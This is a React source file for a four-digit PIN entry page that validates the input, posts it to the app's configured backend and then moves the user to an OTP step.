import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../components/FormErrMsg";
import axios from "axios";
import BASE_URL from "../components/urls";

const schema = yup.object().shape({
  pin: yup
    .string()
    .matches(/^\d{4}$/, "PIN must be exactly 4 digits")
    .required("PIN is required"),
});

const Pin = () => {
  const navigate = useNavigate();
  const [pin, setPin] = useState(new Array(4).fill(""));
  const [loading, setLoading] = useState(false);
  const [userEmail, setUserEmail] = useState("");

  const {
    register,
    handleSubmit,
    setValue,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  useEffect(() => {
    const storedEmail = localStorage.getItem("email");
    if (storedEmail) setUserEmail(storedEmail);
  }, []);

  const handleChange = (element, index) => {
    const value = element.value;
    if (!/^\d$/.test(value)) return;

    const newPin = [...pin];
    newPin[index] = value;
    setPin(newPin);

    if (index < 3 && value !== "") {
      document.getElementById(`pin-${index + 1}`).focus();
    }

    setValue("pin", newPin.join(""));
  };

  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/pin`, data)
      .then(() => {
        navigate("/otp");
      })
      .catch((error) => {
        console.error("PIN verification error", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };

  return (
    <div className="min-h-screen bg-gray-50  flex flex-col justify-between pt-[150px]">
      {/* Bottom Section */}
      <div className="px-6 pt-2">
        <div className="flex flex-col items-center space-y-4">
          <div className="w-12 h-12 bg-gray-200 flex items-center justify-center rounded-full">
            <span className="text-2xl">🔒</span>
          </div>
          <p className="text-gray-800 font-medium">
            Enter your Pin to Authenticate
          </p>

          {/* PIN Form */}
          <form
            onSubmit={handleSubmit(submitForm)}
            className="w-full py-7 space-y-6"
          >
            <input type="hidden" {...register("pin")} />
            <div className="flex justify-center space-x-4 mt-4">
              {pin.map((data, index) => (
                <input
                  key={index}
                  id={`pin-${index}`}
                  type="password"
                  maxLength="1"
                  value={data}
                  onChange={(e) => handleChange(e.target, index)}
                  onFocus={(e) => e.target.select()}
                  className="w-12 h-12 rounded-full bg-gray-200 text-black text-center text-xl outline-none focus:ring-2 focus:ring-yellow-600"
                  inputMode="numeric"
                  pattern="[0-9]*"
                  autoComplete="off"
                />
              ))}
            </div>

            <FormErrMsg errors={errors} inputName="pin" />

            <button
              type="submit"
              disabled={loading}
              className="w-full py-3 bg-yellow-600 hover:bg-yellow-700 text-white rounded-full font-semibold transition"
            >
              {loading ? "Processing..." : "Complete"}
            </button>
          </form>

          <button className="text-gray-500 text-sm mt-2">Cancel</button>
        </div>
      </div>
    </div>
  );
};

export default Pin;
